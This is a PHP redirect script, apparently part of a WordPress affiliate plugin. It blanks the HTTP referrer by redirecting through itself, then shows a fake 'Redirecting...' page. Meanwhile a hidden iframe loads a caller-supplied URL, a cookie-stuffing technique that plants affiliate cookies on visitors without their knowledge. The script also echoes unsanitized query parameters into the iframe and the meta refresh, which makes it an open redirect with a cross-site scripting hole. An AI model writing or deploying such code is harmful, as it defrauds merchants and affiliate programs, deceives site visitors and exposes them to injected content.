<?php
include_once('./../../../wp-config.php');
//echo 1; exit;
$blank_referrer = $_GET['r'];

$stuff_cookie = urldecode($_GET['c']);
$stuff_cookie_preserved = $_GET['c'];
$stuff_cookie  = str_replace('*h*','http://',$stuff_cookie);
$stuff_cookie  = str_replace('*hs*','https://',$stuff_cookie);

$affiliate_url = urldecode($_GET['url']);
$affiliate_url_preserved = $_GET['url'];
$affiliate_url  = str_replace('*h*','http://',$affiliate_url);
$affiliate_url  = str_replace('*hs*','https://',$affiliate_url);
if ($_GET['wash']==1)
{
	
	$wordpress_home = get_bloginfo('url');
	if ( $_SERVER['HTTP_REFERER'] == '' )
	{
		$redirect_url  = $affiliate_url;
	}
	else 
	{
		$redirect_url = $wordpress_home;
	}
}
else
{
    if ($blank_referrer==1)
	{
		if ($stuff_cookie)
		{
			$redirect_url = "redirect.php?wash=1&url=$affiliate_url_preserved&stuff_cookie=$stuff_cookie_preserved";
		}
		else
		{
			$redirect_url = "redirect.php?wash=1&url=$affiliate_url_preserved";
		}
	}
	else
	{
		$redirect_url = "$affiliate_url";
	}
	
}
//echo $r;
//echo $redirect_url;
//echo "<br>";
//echo $stuff_cookie;exit;
?>

<html>
<head>
<?php
if ($stuff_cookie)
{
	//'echo 1; exit;
	print("<meta http-equiv=refresh content='2;url=$redirect_url'>");
}
else
{
	print("<meta http-equiv=refresh content='0;url=$redirect_url'>");
}
?>
</head>
<body>
<?php
if ($stuff_cookie)
{
	?>
	<br><br><br><br><br><br><br>
	<div style='text-align:center'>
			<img src='./images/ajax-loader.gif'><br>
			<i>Redirecting...</i>
	</div>
	<div style='display:none;'>
		<iframe src='<?php echo $stuff_cookie; ?>'></iframe>
	</div>
	<?php
}
?>
</body>
</html>